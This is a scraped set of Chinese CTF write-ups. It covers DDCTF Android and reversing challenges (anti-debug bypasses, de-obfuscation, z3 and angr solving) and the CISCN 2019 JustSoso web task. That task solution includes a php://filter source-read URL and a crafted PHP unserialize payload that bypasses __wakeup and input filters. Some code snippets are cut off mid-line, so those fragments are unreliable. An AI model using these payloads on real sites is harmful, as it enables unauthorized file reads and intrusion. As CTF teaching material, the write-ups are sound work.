java 代码，直接在手机上爆破的（原谅我脑残），发现速度简直慢到炸，手机烫了一晚上也没跑多少数据。 然后想着优化，但发现这个 API 似乎很不好用， G+G+G 和 G*3 不相等，以及各种神奇的表现，可能是我不大会用API吧，按理说加法比乘法好做很多，每次加一比每次乘法应该要快，但优化时候老是算出来的不一样，就懒得优化了。 最后在 PC上写个爆破脚本，早上起来就看到了 flag，DDCTF{54135710}。 LeveL5 这题就是反调试的大集合，乱七八糟的方式什么都有，Java 层没有东西，直接看 native。 init_array 没有特殊操作，是 C++的初始化。 JNI_OnLoad里动态注册了 JNI 函数，没有额外操作。 直接看了哈，最原始的长这样 int __fastcall Java_check(const char *b_input) { void *v2; // r0@1 void *v3; // r5@1 int i; // r2@4 char v6[32]; // [sp+4h] [bp+0h]@1 memset(v6, 0, 0x20u); v2 = dlopen(\"libc.so\", 0); v3 = v2; if ( v2 ) { open = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v2, \"open\"); close = (int (__fastcall *)(int))dlsym(v3, \"close\"); read = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"read\"); strncmp = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"strncmp\"); strstr = (int)dlsym(v3, \"strstr\"); } isTraced = 0; setValue(dword_EF2B5024); maybe_antidebug_1(); some_encrypt_2(dword_EF2B5024, v6); if ( strlen(b_input) == 32 ) { i = 0; do { v6[i] ^= b_input[i]; ++i; } while ( i != 32 ); memcpy(&unk_11100, &v7, 0x20u); // return strncmp(xx, xx, 32); // patch by LeadroyaL } return -1; } 将输入操作一下，xor 一下，返回的是 strncmp 的结果，这不是送分题么？直接上去调试，断下来，发现答案并不对。。。有几个反调试的函数，把 xor_key 给修改了。 sub_3c54是第一个函数，先做一些不知道什么的操作，再检测 tracerPid那行的 strlen ，可以绕过，然后去从sha256_table里取一些值，不知道想干嘛。内层还有一堆不知道在干嘛的函数，估计藏了一些反调试，而且会对 global 的值进行一些操作，乱七八糟的。 反正每次都会被测到反调试，于是懒得搞了，我认输，ok？ patch 一下binary文件，因为是简单的 xor，所以只要能拿到xor_key 即可，在最后一句他是strncmp，如果把它 patch为memcpy的话，在正常运行过程中，就可以将算出来的密文保存下来。之后想办法dump内存，就能拿到密文，与输入进行xor，就拿到了 key。 经过一番努力，终于patch成功了。。。如上图的最后一个 memcpy。 先运行，让它算一遍，再attach，断在最开始，就能拿到明密文对了。 最后算出来是DDCTF{GoodJob,Congratulations!!}。 逆向 感谢奈沙夜影师傅！ Baby MIPS IDA打开发现几个字符串结构都很清晰，提供16个变量，然后进行16次方程校验，但是运行会发现在中间就因为段错误而异常，尝试许久以后发现几个不太对劲的指令，突兀出现的t, sp, 跳转等等的机器码都为EB02开头，猜测为花指令，于是使用IDC脚本去花。 注意MIPS为定长指令集，每个指令都为4字节，因此需要固定监测指令的头部，否则可能会误清除掉正常指令，例如方程参数的赋值 (╯‵□′)╯︵┻━┻ #include static matchBytes(StartAddr, Match) { auto Len, i, PatSub, SrcSub; Len = strlen(Match); while (i 去花后再次分析即可得到清晰的赋值和check过程 有三种求解方法: 方法一：简单粗暴反汇编 写了一个伪执行汇编的py脚本来得到参数，最后清洗一下即可得到方程，通过z3限制BitVec即可跑出整数解 f = open(\"code.txt\", \"r\") flower = [\"slti\", \"sdc1\"] a0 = 0x76ff270 v0 = 0xd0000 v1 = 8 fp = [0 for i in range(0x500)] table = [0x0, 0x42d1f0, 0x0, 0x42d1f0, 0xa, 0xa, 0x0, 0x9, 0x4250bc, 0x9, 0x426630, 0x42d1f0, 0x40a3ec, 0x37343431, 0x363434, 0x0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x0, 0x0, 0x425060, 0x42d1f0, 0x403ad0, 0x0, 0x0, 0x1000, 0x425088, 0x76fff184, 0x412fcd, 0x1, 0x410570, 0x425190, 0x40ca48, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x425088, 0xffffffff, 0x4106c4, 0xffffffff, 0x76fff184, 0x412fcd, 0x1, 0x42d1f0, 0x0, 0x425088, 0x40ccac, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x425190, 0x76ffeef8, 0x425190, 0x10, 0x425088, 0x40baac, 0x42d1f0, 0x412fcd, 0x1, 0x425088, 0x40baac, 0x76fff184, 0x412fce, 0x40b684, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x413081, 0x9, 0x403f24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x413078, 0x0, 0x0, 0x0, 0x0, 0xd0000, 0xf1f4, 0xcf8, 0xf5f1, 0x7883, 0xe2c6, 0x67, 0xeccc, 0xc630, 0xba2e, 0x6e41, 0x641d, 0x716d, 0x4505, 0x76fff224, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfffffffe, 0x0, 0x76fff2ac, 0x412fcd, 0x1, 0x0, 0x6, 0x7fffffff, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa, 0xa, 0x425088, 0x8, 0x7ffffff8, 0x100, 0x413f38, 0x1, 0x413f38, 0x0, 0x2, 0x76fff0f8, 0x0, 0x0, 0x7fffffff, 0x76fff220, 0x405050, 0x550001, 0x0, 0x425000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76fff220, 0x404d84, 0x42d1f0, 0x0, 0x500, 0x5, 0x42d1f0, 0xb3b, 0x76fff224, 0x115, 0x1a131100, 0x76fff220, 0x76fff270, 0x76fff2ac, 0xffbecf88, 0xa, 0x405880] j = 0 functions = 0 for i in range(0xb4, 0x410, 4): fp[i] = table[j] j += 1 input = [int(str(i)*3, 16) for i in range(16)] try: while(True): code = f.readline() if(code == \"\"): print(\"finish\") break if(code[:3] == \"loc\"): # print(\"n[s]:t\" + code[:-1]) continue if(code.find(\"nop\")!=-1): continue code = code.split(\"$\") # print(code) c = code[0].strip() if(c==\"sw\"): n1 = code[1].split(\",\")[0] n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (\"fp[\" + hex(n2) + \"] = \" + n1) elif(c==\"li\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2) elif(c==\"lw\"): n1 = code[1].split(\",\")[0] if(\"\".join(code).find(\"fp\")!=-1): n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (n1 + \" = fp[\" + hex(n2) + \"]\") # print(\"# \" + hex(fp[n2])) #输出方程 print(\"0x%x*\"%fp[n2],end='') else: # print(\"[c]:t\" + \"\".join(code)[:-1], \"v0=%x\"%v0) n2 = ((v0) + int(code[1].split(\",\")[1].replace(\"(\", \"\")))//4 code = (n1 + \" = input[\" + str(n2) + \"]\") print(\"a[%d]\"%n2) # print(code) # print(hex(v0)) # break elif(c==\"sll\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \">\" + n2) elif(c==\"xori\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"^\" + n2) elif(c==\"addiu\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) # print(\"+\") elif(c==\"mul\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() n3 = code[3].strip() code = (n1 + \" = \" + n2 + \"*\" + n3) elif(c==\"addu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) print(\"+\") elif(c==\"subu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"-\" + n2) print(\"-\") elif(c==\"beq\"): print(\"=0x%x\"%(v0)) print(\"================================================one function=====================================\") functions +=1 continue elif(c==\"negu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + \"-\" + n2) print(\"-\") elif(c==\"nop\"): continue elif(c==\"lui\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2 + \"方法二：优雅反编译 在某zhao师傅的提醒下想起来jeb的MIPS版本可以对汇编进行简单的反编译： 虽然数组全部是通过指针+偏移的方式来调用，不过可以全部复制下来再用正则来整理数据，将*(par00+x)替换为par00[x/4]的形式（可不要像某zhao师傅一样将参数一个个抄下来哟（不然就会像他一样把参数不慎抄错几个然后纠结若干小时XDDDDDD 上述两种方法得到方程以后就可以通过z3, numpy, matlab一类的数学工具求解方程组了，下面给出z3py的示例代码 from z3 import * a = [BitVec(\"a%d\"%i, 32) for i in range(16)] s = Solver() s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15] == 0xaa2ed7) s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15] == 0x69d32e) s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15] == 0x3b89d9) s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15] == 0xff6a5aea) s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15] == 0x953584) s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15] == 0xffd31341) s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15] == 0xff9a6b57) s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15] == 0xffd6b3d3) s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15] == 0xc6ea77) s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15] == 0xff1daae5) s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15] == 0xff5be0b4) s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15] == 0x144313b) s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15] == 0xffd18bd2) s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15] == 0xb5cb52) s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15] == 0xa6014d) s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15] == 0x2fde7c) if(s.check()==sat): c = b'' m = s.model() for i in range(16): print(\"a[%d]=%d\"%(i, m[a[i]].as_long())) for i in range(16): print(chr(m[a[i]].as_long()&0xff), end='') 方法三：符号执行 无名侠师傅提出了使用angr来全自动求解的方法，注意二进制文件也需要去过花。我这边不知道是因为capstone没有mips反编译的版本还是地址扒错了跑不出来，只好直接附上师傅的脚本。 注意其中find和avoid的值由于各人的bin文件不同，因此地址需要自行修正。 from angr import * import logging import IPython logging.getLogger('angr.manager').setLevel(logging.DEBUG) p = Project('mips2') state = p.factory.blank_state(addr=0x400420) DATA_ADDR = 0xA0000 state.regs.a0 = DATA_ADDR for i in range(16*4): vec = state.solver.BVS(\"c{}\".format(i),8,explicit_name=True) cond = state.solver.And(vec>=32,vec 黑盒破解 这个题目比较硬核，输入的地方通过比较字符串来选择函数。首先通过构造函数找到整个数据结构的定义 偏移 值 类型 长度 备注 a1 sth_p q 0x100 a1+8 char_table_0_p q 0x100 0x6030e0 a1+16 input c 100 a1+272 rand%50 a1+280 char_table_0_p-sth_p q a1+288+8 char_table_2 d 8 (a1+8)[72+l] 6030e0[l+255] a1+408 char_table_1 b 255 0x603700 a1+672 func_addr q 255 (a1+8)[84+i] 603200+i(+=) a1+672+8 func_table q 8 (a1+8)[84+6030e0[l+255]] 输入函数形式为： for i in range(len(input)): *(a1+664) = input[i+1] for j in range(8): if(f[input[i]] == (a1 + 408)[(a1+8)[72+j]]): call (a1+8)[84 + (a1+8)[j+72]] ( a1 ) 可以看到，实际上就是令Input[i]作为下标取数组f的值，然后遍历char_table_1中的8个值，如有相等的则取func_addr中对应的函数来调用。 一共8个函数，根据提示语可以定位到其中的一个函数，查看交叉引用则能找到另外8个函数的函数表： 逐个反编译发现： 函数名 执行条件 表达式 功能 func_0 (a1+288) (a1+665) = char_table[a1+288] m=c[index] func_1 (a1+288) char_table[a1+288] = (a1+665) c[index]=m func_2 … (a1+665) = (a1+665) + (a1+664) – 33 m+=[next]-33 func_3 … (a1+665) = (a1+665) – ((a1+664) – 33) + 1 m-=[next]-33 func_4 … (a1+288)++ index++ check_func *(a1+664)==’s’ s = char_table_0[(a1+288)], len=20,puts(s) check(s) func_6 … (a1+288)– index– func_7 … 后一个参 char_table_0[a1+288] = input[(a1+288) + (a1+664) – 48] – 49 其中用到的变量一共有4个： a1+292 = 255 a1+664 = [next]（即input[i+1]) a1+665 = m（临时变量） a1+288 = index 在check_func中会输出s，s是从char_table_0中以index为起点取的0x20个值。如果s满足三个方程则通过校验，返回成功。 而实际上那三个方程是不需要逆的—题目中明示了只要输出“Binggo”即可得到flag。因此目标显然是在char_table_0中获得Binggo的字符串，将其dump出来输出了一下发现并字符顺序并没有合适的，甚至上述5个字母都不齐。以及一个最关键的问题，check_func中取了0x20个值赋给s，这显然不符合”Binggo”的要求，因此第七个字符必须给上”使其截断才行。 分析其余7个函数，发现0和1可以交换char_table_0中的字符的位置，2、3和7则可以修改char_table_0中字符的值，4和6则是用来移动下标的，最后check_func加’s’来结束并输出。在构造输入之前，先要找到函数对应的输入值。 逆向一下发现char_table中还被更改了值，IDA动态调试断在函数调用处调用idc脚本,即可得到对应值： auto i, j, v14, p, q; for(i=0;i24 $ 400dc1 38 8 400e7a 43 C 400f3a 74 t 401064 * 30 0 4011c9 45 E 40133d 75 u 4012f3 * 23 # 4014b9 得到这8个输入字符即可开始构造了。 由于函数功能很多样，因此构造方法很多，在此仅表述我的构造方法： 由于输入buffer有限，因此不适合向右移动指针太多来找寻合适的字符。所以我就原地变换—毕竟将一个字符变成另一个字符满打满算也只要4个输入，移动指针可就轻而易举几十上百了。 下列计划中push表示将char_table中的值取入m，A->B表示将A通过func_2和3变换成B，->1表示指针后移1位 push P # $ P->B # t/ pop B # 8 #111(用于填充make，其实1个就够，懒得算了233) B->i # CH ->1 # 0 pop i # 8 i->n # C& ->1 # 0 pop n # 8 ->1 # 0 n->g # t( pop g # 8 ->1 # 0 pop g # 8 g->o # C) ->1 # 0 pop o # 8 ->1 # 0 make x00 # #0 其中的111是为了make x00，在指针指向第七个字符时直接构造，提交给服务器即可获得flag。相对而言我觉得这题是所有（re和安卓）题目中质量最高和最（逆向过程中）有趣的~ 被隐藏的真实 这题本来单纯地以为是很简单的题，听欧佳俊师傅讲了一下出题思路才发现他的想法真的比答题人多得多…… main函数里调用了三次get_pwd()这个函数来check输入 get_pwd中接受输入，然后对count自增，调用了Bitcoin对象的一个函数来校验输入 如果熟悉C++逆向的话，一眼就能看出来这是在调用虚函数 因为v2是对象的空间，在C++的对象构造中，开头4个字节指向的是虚函数表 v2指向的是虚函数表，*v2就是虚函数表的第一个函数了 （图片引自C++对象模型详解释https://www.cnblogs.com/tgycoder/p/5426628.html） 做题的时候不是很熟悉C++的模型，以及虚函数反编译的不是很明显，直接动态调试做的。初始状态这个虚函数是init，其中调用了verify，第一次直接返回输入，对应输出列表的需求，要输入0xdeadbeef的小端序表示”efbeadde”。如果纯静态逆向，会继续往下看verify函数的第二、三次校验，但事实上第二次就没有调用init了。 我在做的时候因为不熟悉虚函数，所以动态调试直接跟进函数，发现进入了sub_4046D7这个函数，其中的核心函数b58e乍看起来很复杂，但其实通过其中的24（实际上是256）、%58，和题目内的信息描述很容易想到比特币地址转换方法–base58 直接进行解密获得bytes类型即可通关（注意最后4字节是sha256的验算字节，不可提交，否则会导致flag的sha256计算错误。因为第二关仅截取19个字符送入，但跟flag有关的sha256却会把所有input全部进行运算，导致最后提示Correct实际上的flag却不对） 话是这么说，直接套来的脚本解密出来其实没看懂，还是自己查资料从加密到解密走了一趟才get到应该是hex格式。第三小关本来以为是脑洞题了，其实是误打误撞做出来的，运气是真的好OTZ 这次虚函数又回到了verify，将Input进行两次sha256然后逆序与结果比较，当时的想法是结合提示语： 查了一下发现这条地址是中本聪在开始比特币时记录的第一个块–创世块，刚开始想到的是根据创世块向区块链后端爆破，某个区块的sha将会满足要求。不过查了一下好像也没什么适合计算的，总不能自己重复一遍挖矿过程吧233 卡了许久，代码中突然发现一个关键点 长度80是个很关键的提示！ 于是去找了区块链结构解析，发现区块头的长度正好是80个字节 https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f.hex 在这里得到了创世块的头部信息，提交即可获得flag 事实上在经过家俊师傅的讲解后，再回头逆才发现这里的memcmp被覆盖到了sub_404A36函数 这个函数中通过异或生成了一个串，然后将输入的字符串与做过两次sha256再逆序的输入进行memcmp。这个两次sha256再逆序的操作，在之前的查资料过程中发现就是比特币的哈希方法，把异或生成的串dump出来去搜索。 IDC>auto i;for(i=0;i发现是创世块的哈希值，由此倒推出原输入是创世块。 比赛的时候从一个长度猜到创世块头部，不得不感叹自己的运气真的是…… 最后再分析一下虚函数的覆盖，和家俊师傅挖下的种种坑 首先注意到虚函数表中的第一个函数在初始情况下是Init 逐步跟踪，发现Bitcoin在构造函数中就有玄机 这里跳转到了0x6D0F88处，过去看看 这时是直接一个leave和retn返回了 但是后面有很多不可识别的脏数据，暂且先放着不管，继续往后走 get_pwd函数中就如之前分析的一样，没什么问题 问题在于析构函数里 乍一看好像没什么问题哦，delete释放空间嘛 注意这里的(this+3)指向的就是刚才跳转的0x6D0F88 再点进delete内一看 ？！ 跟正常调用free的delete完全不一样，左边function列表中也竟然出现了两个同名的函数 另外一个才是调用free的原delete，这个是冒牌的！ 这里利用的是IDA的重命名机制–C++编译器为了区分重载函数，会对函数生成一些其他字符来修饰。delete函数被修饰以后的名称是”_ZdaPv”，但是冒牌delete函数的原名是”__ZdaPv”，IDA同样也会将其重命名为delete，导致被忽视。 这个delete中将参数指向的空间写为0x90，即NOP的机器码 因此可以将刚才的leave、retn和大量脏数据全部写成NOP，从而使下一次调用构造函数的时候可以执行一些其他代码，而这个机密的函数就是脏数据之后的代码，sub_6D1048 这里的a1是rbp，频繁调用的a1-8就是this指针 可以看到，每次调用都会覆盖一次虚函数 另外当第三次执行的时候会将memcmp重写 整个理透以后这个题目学到的应该是最多的，各种阴险技术，真的很有意思23333 可惜做的时候动态跟过去会忽视掉这里的大量重写，比较可惜 探寻逝去的Atlantis文明 打开文件发现啥都没有 运行杀毒软件提示有代码混淆器 OD挂上各种报错，估计有反调 于是从头分析，首先是两个TlsCallback TlsCallback_0中第一个函数sub_402B30动态获取了ZwSetInformationThread设置当前线程的信息 v0 = GetModuleHandleA(&ModuleName); // Ntdll v1 = GetProcAddress(v0, &ProcName); // ZwSetInformationThread v2 = GetCurrentThread(); return ((int (__stdcall *)(HANDLE, signed int, _DWORD, _DWORD))v1)(v2, 17, 0, 0);// ThreadHideFromDebugger 百度一下可以轻松发现这个函数经常被用来反调试，第17个参数正好就是反调用的： 将其首字节改成0xc3，爆破掉即可 后一个函数sub_4028F0同样也是动态获取了4个函数的地址，将它们保存在了一个函数表中留待日后取用。其中一个是IsDebuggerPresent这样的反调函数，另外三个则是VirtualAlloc、VirtualFree和Exit这种有用的函数，因此不可简单Patch 再往后立即就调用了刚才的IsDebuggerPresent，判断到直接Exit 这里Patch或者下断过都行，小问题 TlsCallback_1里则是一个MessageBox，无关紧要 接着进入main主函数 那三个连续的函数不用在意，解密代码很复杂，无需关心 sub_43180里是对Debug断点的Hook 我们知道调试器下断的原理是将某个地址的机器码改为0xcc，使其触发异常，从而被调试器捕捉中断 这个Hook会将0xcc改为0xc3，直接ret，导致不仅调试器捕捉不到断点，而且会直接令程序崩溃 这个函数里除了Hook没有别的东西，直接Patch掉 sub_403010里才是重头戏，通过memcpy将解密后的代码送入开辟出的空间中，然后直接调用 几个函数通过F8步过函数可以大致猜测出功能 关键在change_input和check两个函数中 其实当把那几个反调试通过以后就问题就不大了 动态调试跟进去，发现change_input中将Inputbase64后通过GlobalAddAtom将其加入了全局原子 再往后跟的几个函数都格外的复杂，再加上代码是动态解密的，每次都需要自己MakeCode再F5才能浏览一遍猜测是否需要详细跟踪 事实上在AddAtom之后虽然还有几个函数调用了Input的指针，但它们都是释放空间用的。 这个AddAtom添加了一个全局可用的字符串，必然在某处调用了GlobalGetAtomName 因此不妨稍微忽视一下其他函数，再往后跟 果不其然在v19，即check中捕捉到了GlobalGetAtomName的调用 该函数中生成了一个table，然后将table进行一顿操作后与Input逐字节异或，最后与另一个值进行比较—非常简单粗暴常见的逆向套路了 可以通过dump将table得到，然后效仿操作与结果数组异或从而得到flag 但更简单的方法当然是注意到这两点： 异或的逆运算还是异或 将table进行一顿操作与input完全无关 因此将结果数组直接放入Input的地址中，等到比较的时候，该地址中就是我们需要input的值了 解base64轻松得到flag。 评论区 请文明评论，禁止广告 "},"articals/2019national.html":{"url":"articals/2019national.html","title":"2019全国信安赛","keywords":"","body":"2019全国大学生信息安全大赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 网上公开WP: https://www.zhaoj.in/read-5417.html https://xz.aliyun.com/t/4906 https://xz.aliyun.com/t/4904 https://www.52pojie.cn/thread-936377-1-1.html http://12end.xyz/essay1/ https://impakho.com/post/ciscn-2019-online-writeup 题目下载： 链接: https://pan.baidu.com/s/1Oz3GjZ7oSdjiFHbz29huMA 提取码: x81y 本站备份WP： 感谢作者：Glzjin、wu1a、warden、lizhirui、12end、七月火 Web 作者：Glzjin、七月火 JustSoso 解法一 题目 知识点：任意文件读取，PHP 反序列化 步骤： 1、打开靶机，发现是这样一个页面。 2、来看看源码。给了参数和提示，让获取 hint.php 的源码。 3、那么就来获取源码看看吧，访问 /?file=php://filter/read=convert.base64-encode/resource=hint.php 4、BASE64 解码一下，得到 hint.php 的源码。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } ?> 5、重复上面的 3~4 步，获取 index.php 的源码。 '; } if(preg_match(\"/flag/\",$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo \"Missing parameters\"; } ?> 6、来审计一下源码。 index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。 然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。 7、把源码拷到本地，来伪造序列化对象。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); $this->token = &$this->token_flag; } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } $flag = new Flag(\"flag.php\"); $handle = new Handle($flag); echo serialize($handle).\"\\n\"; ?> 这里我们加了一行： $this->token = &$this->token_flag; 这样做主要是为了下面 getFlag 那的比较，因为这样的引用变量和他所指向的变量一比较，当然相等了。 后面三行就是要求去读 flag.php 文件，然后序列化对象了。 8、运行一下，生成。 9、打上去，注意 Handle 里的 handle 是私有成员变量，所以得特殊处理下，里面的方块那记得换成 %00。还有为了不触发 weak up[1]，所以我们得改下 payload,把成员数目改大些。同时为了绕过后面对于 payload 的检测，我们还要再前面加几个 /[2]。所以这里就是访问 ///?file=hint.php&payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;s:32:”b77375f945f272a2084c0119c871c13c”;s:10:”token_flag”;R:4;}} 参考资料[1]:https://www.jianshu.com/p/67ef6f662a4d 参考资料[2]:http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html 10、访问一下。 11、Flag 到手~ Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551} 解法二 作者：12end 